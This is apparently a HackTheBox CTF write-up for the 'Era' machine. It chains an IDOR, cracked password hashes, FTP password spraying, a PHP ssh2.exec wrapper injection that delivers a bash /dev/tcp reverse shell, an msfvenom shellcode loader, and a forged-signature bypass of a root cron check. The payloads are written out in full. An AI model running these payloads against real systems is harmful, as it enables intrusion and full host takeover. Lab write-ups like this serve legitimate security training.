---
layout: page
title: "Era (HTB) â€“ CTF Writeup"
date: 2025-11-13

author: "Kerburenthusiasm"

# Collections / taxonomy
categories:
  - CTF
  - HackTheBox
platform: "htb"

tags:
  - IDOR
  - PHP-Wrappers
  - SSH2
  - Reverse-Engineering
  - Ghidra

excerpt: "Full walkthrough of the Era HackTheBox machine."
---

# Machine Information
- **Difficulty:** Medium
- **OS:** Linux

# Initial Enumeration
The following ports were identified
- 21
- 80

## Web Application Enumeration
When we access the application on port 80, it automatically redirects us to `http://era.htb`. Add the domain into our `/etc/hosts` file. Apart from discovering a potential username candidate, `support@era.htb`, the page itself seems to by atypical HTB web application.

Afterwards, `ffuf` was utilized to identify any sub-domains:
``` bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.era.htb" -u "http://era.htb" -fs 154

<truncated>
file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 40ms]
```

Add `file.era.htb` to the `/etc/hosts`. Visiting `http://file.era.htb` presents a web application which allows one to
- Manage Files
- Upload Files
- Update Security Questions
- Sign In

After some quick enumeration, we managed to identify the `register.php` page. After registering, login with the created account.
> Note: This may require a reset because I was unable to login after registering for some odd reasons.

### Indirect Object Reference (IDOR)
The "Update Security Section" allows one to update security questions so that it can be used to login if the password is forgotten. It appears that a lack of validation is in place as I was able to set the security questions for `admin`.

```
POST /reset.php HTTP/1.1
Host: file.era.htb
Content-Length: 65
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://file.era.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://file.era.htb/reset.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ittmt2388kdf42t5b0dv5fhqim
Connection: keep-alive

username=admin&new_answer1=anon&new_answer2=anon&new_answer3=anon
```

After setting the security questions, login to the application as `admin`.
### Enumerating Web Application as Admin
The web application includes file upload functionality. I uploaded a PHP web shell named `shell.php`, which returned a download link: `http://file.era.htb/download.php?id=2394`. While there's no direct upload directory to execute the shell, the sequential ID parameter in the download link suggests another IDOR vulnerability that could be exploited to enumerate other uploaded files.

A simple Python script can be used to enumerate:
``` python
#!/usr/bin/env python3
import requests

# Configuration
TARGET_URL = "http://file.era.htb/download.php"
SESSION_COOKIE = "<session_cookie>"
MIN_LENGTH = 7686
START_ID = 1
END_ID = 100  # Adjust range as needed

# Headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

cookies = {
    "PHPSESSID": SESSION_COOKIE
}

def main():
    interesting_files = []
    
    for file_id in range(START_ID, END_ID + 1):
        try:
            params = {"id": file_id}
            response = requests.get(TARGET_URL, params=params, headers=headers, 
                                   cookies=cookies, timeout=5, allow_redirects=False)
            
            content_length = len(response.content)

            if content_length != MIN_LENGTH:
                print(f"Interesting file: {file_id}, {content_length}")

        except requests.exceptions.RequestException as e:
            print(f"[-] ID {file_id:3d}: Error - {e}")
    
if __name__ == "__main__":
    main()
```

The id `54` was identified and reference to a `.zip` file called `site-backup-30-08-24.zip` and another id `150` re
The following files were found
- ID 54, `site-backup-30-08-24.zip`
- ID 150, `signing.zip`

 The `.zip` file `site-backup-30-08-24.zip` contains the backup of the site while `signing.zip` contains  `key.pem` and `.x509.genkey`.
#### Signing
The `x509.genkey` contains the following:
```
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid
```

This could mean that the `.pem` file belongs to the user `yurivich@era.com`.
#### Site Backup
The site backup contains the file `filedb.sqlite`:

| user_name         | password                                                       | role_id | security_question1 | security_question2 | security_question3 |
| :---------------- | :------------------------------------------------------------- | -----: | :----------------- | :----------------- | :----------------- |
| admin_ef01cab31aa | `$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC` |    600 | Maria              | Oliver             | Ottawa             |
| eric              | `$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm` |     -1 |                    |                    |                    |
| veronica          | `$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK` |     -1 |                    |                    |                    |
| yuri              | `$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.` |     -1 |                    |                    |                    |
| john              | `$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6` |     -1 |                    |                    |                    |
| ethan             | `$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC` |     -1 |                    |                    |                    |


Similar to before, we reset the security question of `admin_ef01cab31aa`. Additionally, `eric` and `yuri` password can be cracked to `america` and `mustang` respectively. Afterwards, the `.php` files were analyze and it was identified that the `download.php` is vulnerable:

``` php
if ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
	$format = isset($_GET['format']) ? $_GET['format'] : '';
	$file = $fetched[0];

	if (strpos($format, '://') !== false) {
			$wrapper = $format;
			header('Content-Type: application/octet-stream');
	} else {
			$wrapper = '';
			header('Content-Type: text/html');
	}

	try {
			$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
			$full_path = $wrapper ? $wrapper . $file : $file;
			// Debug Output
			echo "Opening: " . $full_path . "\n";
			echo $file_content;
	} catch (Exception $e) {
			echo "Error reading file: " . $e->getMessage();
}
```

The vulnerabilities lies with the user-controlled `format` parameter allows PHP wrappers and protocols. Attempting the following PoC does not seem to work:
```
http://file.era.htb/download.php?id=2394&show=true&format=php://filter/convert.base64-encode/resource=/../../../etc/passwd
```
## Enumerating FTP service
### Authenticating with `.pem`
According to this Reddit [post](https://www.reddit.com/r/linuxquestions/comments/98vrpw/how_do_i_connect_to_remote_ftp_server_using_a_pem/), there's a way to authenticate to FTP service using a `.pem` file.
``` bash
sftp -i key.pem yurivich@era.com
```
> This does not work because `sftp` requires `ssh` service to establish the FTP securely.

### Password Spraying
With the usernames and passwords identified, we perform a password spraying of the FTP service:
``` bash
nxc ftp era.htb -u usernames.list -p passwords.list --continue-on-success
FTP         10.129.26.194   21     era.htb          [-] admin_ef01cab31aa:america (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] eric:america (Response:530 Permission denied.)
FTP         10.129.26.194   21     era.htb          [-] veronica:america (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] yuri:america (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] john:america (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] ethan:america (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] admin_ef01cab31aa:mustang (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] eric:mustang (Response:530 Permission denied.)
FTP         10.129.26.194   21     era.htb          [-] veronica:mustang (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [+] yuri:mustang
FTP         10.129.26.194   21     era.htb          [-] john:mustang (Response:530 Login incorrect.)
FTP         10.129.26.194   21     era.htb          [-] ethan:mustang (Response:530 Login incorrect.)
```

The following files were identified:
```
000-default.conf
apache2.conf
calendar.so
ctype.so
dom.so
exif.so
ffi.so
file.conf
fileinfo.so
ftp.so
gettext.so
iconv.so
opcache.so
pdo.so
pdo_sqlite.so
phar.so
ports.conf
posix.so
readline.so
shmop.so
simplexml.so
sockets.so
sqlite3.so
ssh2.so
sysvmsg.so
sysvsem.so
sysvshm.so
tokenizer.so
xmlreader.so
xml.so
xmlwriter.so
xsl.so
zip.so
```

According to Claude, `.so` files are compiled **PHP extension modules** that add functionality to PHP and they're loaded via `php.ini` or configuration files. Additionally, `ssh2.so` was flagged out by Claude as interesting. An example of how `ssh2.so` would be used in a PHP file was provided in `php.net`:
``` php
<?php
$connection = ssh2_connect('shell.example.com', 22);

if (ssh2_auth_agent($connection, 'username')) {
  echo "Authentication Successful!\n";
} else {
  die('Authentication Failed...');
}
?>
```

Going down the rabbit hole, we identified the [link](https://www.php.net/manual/en/wrappers.ssh2.php) with similar example as above while providing an alternate way to utilize the extension modules:
``` php
ssh2.shell://user:pass@example.com:22/xterm
ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
ssh2.sftp://user:pass@example.com:22/path/to/filename
```

The usage `ssh2.exec` seems interesting. Let's craft a PoC:
``` bash
curl 'http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20%2Dc%20%27%2Fbin%2Fbash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2Ex%2Ex%2F8000%200%3E%261%27%3B' -H 'Cookie: PHPSESSID=ns9d4mqginsahjj84pb75db03b'
```

The payload can be decoded to:
``` bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.x.x/8000 0>&1';
```
> The `;` is required because the file name is appended after the command.

And we obtain a reverse shell as `yuri`.
## Enumerating as `yuri`
Running `pspy64` we observe the following background process:
``` bash
2025/11/12 15:27:40 CMD: UID=0     PID=1      | /sbin/init 
2025/11/12 15:28:01 CMD: UID=0     PID=23477  | /usr/sbin/CRON -f -P 
2025/11/12 15:28:01 CMD: UID=0     PID=23479  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23478  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/11/12 15:28:01 CMD: UID=0     PID=23480  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/11/12 15:28:01 CMD: UID=0     PID=23481  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23482  | 
2025/11/12 15:28:01 CMD: UID=0     PID=23485  | grep -oP (?<=UTF8STRING        :)Era Inc. 
2025/11/12 15:28:01 CMD: UID=0     PID=23483  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23488  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23487  | 
2025/11/12 15:28:01 CMD: UID=0     PID=23486  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23489  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23479  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23478  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/11/12 15:28:01 CMD: UID=0     PID=23480  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/11/12 15:28:01 CMD: UID=0     PID=23481  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23482  | 
2025/11/12 15:28:01 CMD: UID=0     PID=23485  | grep -oP (?<=UTF8STRING        :)Era Inc. 
2025/11/12 15:28:01 CMD: UID=0     PID=23483  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23488  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23487  | 
2025/11/12 15:28:01 CMD: UID=0     PID=23486  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:28:01 CMD: UID=0     PID=23489  | /bin/bash /root/initiate_monitoring.sh2025/11/12 15:29:01 CMD: UID=0     PID=23494  | /usr/sbin/CRON -f -P 
2025/11/12 15:29:01 CMD: UID=0     PID=23495  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/11/12 15:29:01 CMD: UID=0     PID=23496  | bash -c /root/initiate_monitoring.sh 
2025/11/12 15:29:01 CMD: UID=0     PID=23497  | 
2025/11/12 15:29:01 CMD: UID=0     PID=23498  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:29:01 CMD: UID=0     PID=23499  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:29:01 CMD: UID=0     PID=23502  | grep -oP (?<=UTF8STRING        :)Era Inc. 
2025/11/12 15:29:01 CMD: UID=0     PID=23500  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:29:01 CMD: UID=0     PID=23505  | grep -oP (?<=IA5STRING         :)yurivich@era.com 
2025/11/12 15:29:01 CMD: UID=0     PID=23503  | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 15:29:01 CMD: UID=0     PID=23506  | /opt/AV/periodic-checks/monitor 
2025/11/12 15:29:04 CMD: UID=0     PID=23507  | rm -f text_sig_section.bin
```

A background process stands out: `/opt/AV/periodic-checks/monitor`. Unfortunately, the files are inaccessible:
``` bash
ls: cannot access '/opt/AV/periodic-checks': Permission denied
ls: cannot access '/opt/AV/.': Permission denied
ls: cannot access '/opt/AV/..': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
d????????? ? ? ? ?            ? periodic-checks
```

## Enumerating as `eric`
Remembering the `key.pem` obtained previous, authenticate to the local SSH service as `eric` and obtain the first flag.
``` bash
yuri@era:~$ chmod 600 key.pem 
yuri@era:~$ ssh -i key.pem eric@127.0.0.1
eric@127.0.0.1's password: # america
```

`eric` belongs to the `devs` group:
``` bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

The previously blocked directory can be accessed by us:
``` bash
eric@era:~$ ls -la /opt/AV/periodic-checks
total 32
drwxrwxr-- 2 root devs  4096 Nov 12 15:34 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Nov 12 15:34 monitor
-rw-rw---- 1 root devs   205 Nov 12 15:34 status.log
```

Having `write` permission over monitor allows us to modify the file.
# Privilege Escalation
Generate a malicious reverse shell payload with `msfvenom`:
``` bash 
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.24 LPORT=4444 -f elf -o monitor
```

Afterwards transfer the malicious file to the host and wait for it to be executed. Reviewing the `status.log` file we find that there are measures in place to prevent tampering:
``` shell
[*] System scan initiated...
[*] No threats detected. Shutting down...
[SUCCESS] No threats detected.
[*] System scan initiated...
[*] No threats detected. Shutting down...
[SUCCESS] No threats detected.
objcopy: error: the input file '/opt/AV/periodic-checks/monitor' has no sections
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```
## Bypassing Tamper Protection
Running `pspy64` again, we obtained a better understanding of how the signature is being checked:
``` bash
2025/11/12 23:24:01 CMD: UID=0     PID=4822   | bash -c /root/initiate_monitoring.sh 
2025/11/12 23:24:01 CMD: UID=0     PID=4823   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/11/12 23:24:01 CMD: UID=0     PID=4824   | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 23:24:01 CMD: UID=0     PID=4825   | openssl asn1parse -inform DER -in text_sig_section.bin 
2025/11/12 23:24:01 CMD: UID=0     PID=4828   | grep -oP (?<=UTF8STRING        :)Era Inc. 
<truncated>
2025/11/12 23:25:01 CMD: UID=0     PID=4836   | bash -c /root/initiate_monitoring.sh 
2025/11/12 23:25:01 CMD: UID=0     PID=4835   | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/11/12 23:25:01 CMD: UID=0     PID=4837   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/11/12 23:25:01 CMD: UID=0     PID=4838   | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 23:25:01 CMD: UID=0     PID=4839   | openssl asn1parse -inform DER -in text_sig_section.bin 
2025/11/12 23:25:01 CMD: UID=0     PID=4842   | grep -oP (?<=UTF8STRING        :)Era Inc.
2025/11/12 23:25:01 CMD: UID=0     PID=4840   | /bin/bash /root/initiate_monitoring.sh 
2025/11/12 23:25:01 CMD: UID=0     PID=4845   | grep -oP (?<=IA5STRING         :)yurivich@era.com 
```
From the output, it can be observed that:
1. The script `initiate_monitoring.sh` dumps the `.text_sig` into `text_sig_section.bin`
2. Parses the extracted signature as `ASN.1 DER` format (commonly used for certificates/signatures)
3. Validate the expected values.
### Attempt 1: Signing the binary (Failed)
Generate the malicious binary and compile it:
``` c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char buf[] = 
// msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f c

int main() {
    // Allocate executable memory
    void *exec = mmap(0, sizeof(buf), PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // Copy shellcode to executable memory
    memcpy(exec, buf, sizeof(buf));
    
    // Execute it
    ((void(*)())exec)();
    
    return 0;
}
```

With the previously obtained private key `key.pem`, generate a new certificate
``` bash
openssl req -new -x509 -key key.pem -out cert.pem -days 365 -config x509.genkey
```

Convert the cert into DER format:
``` bash
openssl x509 -in cert.pem -outform DER -out cert.der
```

Add the DER to ELF:
``` bash
objcopy --add-section .text_sig=cert.der --set-section-flags .text_sig=noload,readonly monitor monitor-signed
```

Verify the new binary:
``` bash
objcopy --dump-section .text_sig=text_sig_section.bin monitor-signed

openssl asn1parse -inform DER -in text_sig_section.bin | grep -oP '(?<=IA5STRING         :)yurivich@era.com'
yurivich@era.com
yurivich@era.com

openssl asn1parse -inform DER -in text_sig_section.bin | grep -oP '(?<=UTF8STRING        :)Era Inc.' 

Era Inc.
Era Inc.
```

Transfer the new signed binary to the victim machine. However, tampering was still identified.

### Attempt 2: Copying and replacing `.text_sig`
Dump the `.text_sign` of the original binary:
``` bash
objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
```

Copy the dump `.text_sign` to the malicious binary:
``` bash
objcopy --add-section .text_sig=text_sig_section.bin --set-section-flags .text_sig=noload,readonly monitor-unsigned monitor-signed
```

Transfer the malicious signed binary to the machine and wait for the binary to be executed. Shortly after, we obtain shell as `root`.
# Others
## Understanding tampering
### Analyzing initiate_monitoring.sh
Examining the validation script `/root/initiate_monitoring.sh` reveals why our initial attempt failed:
``` bash
#!/bin/bash

# Paths
BINARY="/opt/AV/periodic-checks/monitor"
SECTION=".text_sig"
EXTRACTED_SECTION="text_sig_section.bin"
ORGANIZATION="Era Inc."
EMAIL="yurivich@era.com"

# Extract the .text_sig section
objcopy --dump-section "$SECTION"="$EXTRACTED_SECTION" "$BINARY"

# Parse the ASN.1 structure
OUTPUT=$(openssl asn1parse -inform DER -in "$EXTRACTED_SECTION" 2>/dev/null)

if [[ $? -ne 0 ]]; then
    echo "[ERROR] Executable not signed. Tampering attempt detected. Skipping."
    rm -f "$EXTRACTED_SECTION"
    exit 1
fi

# Check for the organization name
ORG_CHECK=$(echo "$OUTPUT" | grep -oP "(?<=UTF8STRING        :)$ORGANIZATION")

# Check for the email address
EMAIL_CHECK=$(echo "$OUTPUT" | grep -oP "(?<=IA5STRING         :)$EMAIL")

# Decision logic
if [[ "$ORG_CHECK" == "$ORGANIZATION" && "$EMAIL_CHECK" == "$EMAIL" ]]; then
    $BINARY
    echo "[SUCCESS] No threats detected."
    ALLOW=1
else
    echo "[FAILURE] Binary has been tampered with. Skipping."
    ALLOW=0
fi

# Cleanup
rm -f "$EXTRACTED_SECTION"

# Exit with appropriate status
exit $ALLOW
```

The script performs a **string equality check** at line 28:
``` bash
if [[ "$ORG_CHECK" == "$ORGANIZATION" && "$EMAIL_CHECK" == "$EMAIL" ]]; then
```

When we tested our self-signed certificate earlier, we noticed it contained the required strings **twice**.
### Solution
The duplication happens because `Issuer = Subject` in self-signed certs. In order to solve this issue, we first have to create a CA (Certificate Authority) certificate with different details:
``` bash
openssl req -new -x509 -newkey rsa:2048 -nodes -keyout ca_key.pem -out ca_cert.pem -days 365 -subj "/O=Certificate Authority/CN=Root CA/emailAddress=ca@rootca.com"
```

Create a Certificate Signing Request (CSR) using x509.genkey config:
``` bash
openssl req -new -key key.pem -out cert.csr -config x509.genkey
```

Sign the CSR with the CA to create your final certificate:
``` bash
openssl x509 -req -in cert.csr -CA ca_cert.pem -CAkey ca_key.pem \
  -CAcreateserial -out cert.pem -days 365 \
  -extensions myexts -extfile x509.genkey
```

Finally, convert to DER format:
``` bash
openssl x509 -in cert.pem -outform DER -out cert.der
```

Add the `DER` to the binary again:
``` bash
objcopy --add-section .text_sig=cert.der --set-section-flags .text_sig=noload,readonly monitor-unsigned monitor-signed
```

Transfer the file again and obtain the shell as root:
``` bash
root@era:/root# whoami
root
```